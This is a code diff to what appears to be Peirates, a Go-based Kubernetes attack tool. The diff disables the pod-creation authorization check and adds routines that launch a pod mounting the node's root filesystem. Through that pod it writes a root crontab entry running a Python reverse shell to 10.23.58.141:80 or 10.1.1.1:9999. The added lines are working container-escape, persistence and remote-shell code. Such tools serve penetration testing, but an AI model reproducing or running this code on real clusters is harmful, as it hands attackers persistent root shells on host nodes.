@@ -238,7 +238,7 @@ func runKubectlSimple(cfg ServerInfo, cmdArgs ...string) ([]byte, []byte, error)
 
 // canCreatePods() runs kubectl to check if current token can create a pod
 func canCreatePods(connectionString ServerInfo) bool {
-	canCreateRaw, _, err := runKubectlSimple(connectionString, "auth", "can-i", "create", "pod")
+	canCreateRaw, _, err := runKubectlSimple(connectionString, "auth", "can-i", "create", "pod") // ERROR ADAM FIX
 	if err != nil {
 		return false
 	} else {
@@ -577,15 +577,15 @@ func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 
 func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 	var MountInfoVars = MountInfo{}
-
+	println("test-1")
 	// BUG: this routine seems to create the same pod name every time, which makes it so it can't run twice.
 
 	// First, confirm we're allowed to create pods
-	if !canCreatePods(connectionString) {
-		println("AUTHORIZATION: this token isn't allowed to create pods in this namespace")
-		return
-	}
-
+	//if !canCreatePods(connectionString) { - Adam
+	//	println("AUTHORIZATION: this token isn't allowed to create pods in this namespace")
+	//	return
+	//}
+	println("test-2")
 	// TODO: changing parsing to occur via JSON
 	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image
 
@@ -595,6 +595,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 	approach1_success := false
 	var image string
 	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
+	println("test-3")
 	if err != nil {
 		approach1_success = false
 		println("DEBUG: describe pod didn't work")
@@ -701,13 +702,21 @@ spec:
 		attackPodName := "attack-pod-" + randomString
 		println("[+] Executing code in " + attackPodName + " to get its underlying host's root password hash - please wait for Pod to stage")
 		time.Sleep(5 * time.Second)
-		shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
+		//shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
+		//_, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
+		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.23.58.141\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh -i\"]);'")
+		stdout := bytes.Buffer{}
+		stderr := bytes.Buffer{}
+		fmt.Println("Testing1")
+		err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "touch /foo && cat >> /root/etc/crontab")
+		fmt.Println("Testing2")
+
 		if err != nil {
 			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
 			println("Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
 			return
 		} else {
-			println(string(shadowFileBs))
+			//println(string(shadowFileBs))
 		}
 	}
 	//out, err = exec.Command("").Output()
@@ -786,6 +795,163 @@ ________________________________________
 
 }
 
+func ReadFile(filename string) {
+	data, err := ioutil.ReadFile(filename)
+	if err != nil {
+		log.Panicf("failed reading data from file: %s", err)
+	}
+	fmt.Printf("\nFile Content: %s", data)
+}
+
+func crontab_persist_exec(allPodsListme []string, connectionString ServerInfo) {
+
+	var MountInfoVars = MountInfo{}
+	println("test-1")
+	// BUG: this routine seems to create the same pod name every time, which makes it so it can't run twice.
+
+	// First, confirm we're allowed to create pods
+	//if !canCreatePods(connectionString) { - Adam
+	//	println("AUTHORIZATION: this token isn't allowed to create pods in this namespace")
+	//	return
+	//}
+	println("test-2")
+	// TODO: changing parsing to occur via JSON
+	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image
+
+	// Approach 1: Try to get the image file for my own pod
+	//./kubectl describe pod `hostname`| grep Image:
+	hostname := os.Getenv("HOSTNAME")
+	approach1_success := false
+	var image string
+	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
+	println("test-3")
+	if err != nil {
+		approach1_success = false
+		println("DEBUG: describe pod didn't work")
+	} else {
+		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
+		for _, line := range podDescriptionLines {
+			start := strings.Index(line, "Image:")
+			if start != -1 {
+				// Found an Image line -- now get the image
+				image = strings.TrimSpace(line[start+6:])
+				println("Found image :", image)
+				approach1_success = true
+
+				MountInfoVars.image = image
+			}
+		}
+		if !approach1_success {
+			println("DEBUG: did not find an image line in your pod's definition.")
+		}
+	}
+
+	if approach1_success {
+		println("Got image definition from own pod.")
+	} else {
+		// Approach 2 - use the most recently staged running pod
+		//
+		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.
+
+		// Future version of approach 2:
+		// 	Let's make something to mount the root filesystem, but not pick a deployment.  Rather,
+		// it should populate a list of all pods in the current namespace, then iterate through
+		// images trying to find one that has a shell.
+
+		// Here's the useful part of that data.
+
+		// type PodDetails struct {
+		// 	Items      []struct {
+		// 		Metadata   struct {
+		// 			Name            string `json:"name"`
+		// 			Namespace       string `json:"namespace"`
+		// 		} `json:"metadata"`
+		// 		Spec struct {
+		// 			Containers []struct {
+		// 				Image           string `json:"image"
+
+		println("Getting image from the most recently-staged pod in thie namespace")
+		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
+		if err != nil {
+			//log.Fatal(err)
+			println("ERROR: Could not get pods")
+			return
+		}
+		getImageLines := strings.Split(string(getImagesRaw), "\n")
+		for _, line := range getImageLines {
+			matched, err := regexp.MatchString(`^\s*$`, line)
+			if err != nil {
+				println("ERROR: could not parse pod list")
+				return
+				// log.Fatal(err)
+			}
+			if !matched {
+				//added checking to only enumerate running pods
+				// BUG: Did we do this? Check.
+				MountInfoVars.image = strings.Fields(line)[7]
+				//fmt.Println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
+			}
+		}
+	}
+
+	//creat random string
+	rand.Seed(time.Now().UnixNano())
+	randomString := randSeq(6)
+
+	// Create Yaml File
+	MountInfoVars.yamlBuild = fmt.Sprintf(`apiVersion: v1
+kind: Pod
+metadata:
+	annotations:
+	labels:
+	name: attack-pod-%s
+	namespace: %s
+spec:
+	containers:
+	- image: %s
+	imagePullPolicy: IfNotPresent
+	name: attack-container
+	volumeMounts:
+	- mountPath: /root
+		name: mount-fsroot-into-slashroot
+	volumes:
+	- name: mount-fsroot-into-slashroot
+	hostPath:
+		path: /
+`, randomString, connectionString.Namespace, MountInfoVars.image)
+
+	// Write yaml file out to current directory
+	ioutil.WriteFile("attack-pod.yaml", []byte(MountInfoVars.yamlBuild), 0700)
+
+	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
+	if err != nil {
+		println("Pod did not stage successfully.")
+		return
+	} else {
+		attackPodName := "attack-pod-" + randomString
+		println("[+] Executing code in " + attackPodName + " to get its underlying host's root password hash - please wait for Pod to stage")
+		time.Sleep(5 * time.Second)
+		//_, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
+		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.1.1.1\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh -i\"]);")
+		stdout := bytes.Buffer{}
+		stderr := bytes.Buffer{}
+		err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "cat >> /etc/crontab")
+
+		if err != nil {
+			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
+			println("Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
+			return
+		} else {
+			//println(string(shadowFileBs))
+		}
+	}
+	//out, err = exec.Command("").Output()
+	//if err != nil {
+	//	fmt.Println("Token location error: ", err)
+	//}
+	//fmt.Println(out)
+}
+
 //------------------------------------------------------------------------------------------------------------------------------------------------
 
 func PeiratesMain() {
@@ -794,7 +960,7 @@ func PeiratesMain() {
 	// default values
 	connectionString := ParseLocalServerInfo()
 	cmdOpts := CommandLineOptions{connectionConfig: &connectionString}
-	var kubeRoles KubeRoles
+	//var kubeRoles KubeRoles
 	var podInfo PodDetails
 
 	// Store all acquired namespaces for this cluster in a global variable, populated and refreshed by PrintNamespaces()
@@ -818,7 +984,7 @@ func PeiratesMain() {
 		println("- You are not in a Kubernetes pod.")
 	}
 
-	allPods := getPodList(connectionString)
+	//allPods := getPodList(connectionString)
 
 	var input int
 	for ok := true; ok; ok = (input != 2) {
@@ -1012,12 +1178,17 @@ Peirates:># `)
 
 		// [11] Launch a pod mounting its node's host filesystem
 		case "11":
-			podCreation := canCreatePods(connectionString)
-			if !podCreation {
-				println(" This token cannot create pods on the cluster")
-				break
-			}
+			allPods := getPodList(connectionString)
+			// TODO: See if we can put the auth check back
+			//podCreation := canCreatePods(connectionString)
+			//podCreation:= true
+			//if ! podCreation {
+			//	println(" This token cannot create pods on the cluster")
+			//	break
+			//}
+			//crontab_persist_exec(allPods, connectionString)
 			MountRootFS(allPods, connectionString)
+			fmt.Scanln(&user_response)
 			break
 
 		// [13] Request IAM credentials from AWS Metadata API [AWS only] [not yet implemented]
@@ -1251,28 +1422,28 @@ Peirates:># `)
 
 	//	allPods := getPodList(connectionString)
 
-	GetRoles(connectionString, &kubeRoles)
-	GetPodsInfo(connectionString, &podInfo)
-	GetHostMountPoints(podInfo)
-	GetHostMountPointsForPod(podInfo, "attack-daemonset-6fmjc")
-	for _, pod := range allPods {
-		// JAY / TODO: Put me back
-		println("Running a hostname command in pod: " + pod)
-		print(getHostname(connectionString, pod))
-	}
-	if cmdOpts.commandToRunInPods != "" {
-		if len(cmdOpts.podsToRunTheCommandIn) > 0 {
-			execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
-		} else {
-			execInAllPods(connectionString, cmdOpts.commandToRunInPods)
-		}
-	}
-	podCreation := canCreatePods(connectionString)
-	if podCreation {
-		println("+ This token can create pods on the cluster")
-	} else {
-		println(" This token cannot create pods on the cluster")
-	}
-	MountRootFS(allPods, connectionString)
+	//GetRoles(connectionString, &kubeRoles)
+	//GetPodsInfo(connectionString, &podInfo)
+	//GetHostMountPoints(podInfo)
+	//GetHostMountPointsForPod(podInfo, "attack-daemonset-6fmjc")
+	//for _, pod := range allPods {
+	// JAY / TODO: Put me back
+	//	println("Running a hostname command in pod: " + pod)
+	//	print(getHostname(connectionString, pod))
+	//}
+	//if cmdOpts.commandToRunInPods != "" {
+	//	if len(cmdOpts.podsToRunTheCommandIn) > 0 {
+	//		execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
+	//	} else {
+	//		execInAllPods(connectionString, cmdOpts.commandToRunInPods)
+	//	}
+	//}
+	//podCreation := canCreatePods(connectionString)
+	//if podCreation {
+	//	println("+ This token can create pods on the cluster")
+	//} else {
+	//	println(" This token cannot create pods on the cluster")
+	//}
+	//MountRootFS(allPods, connectionString)
 
 }
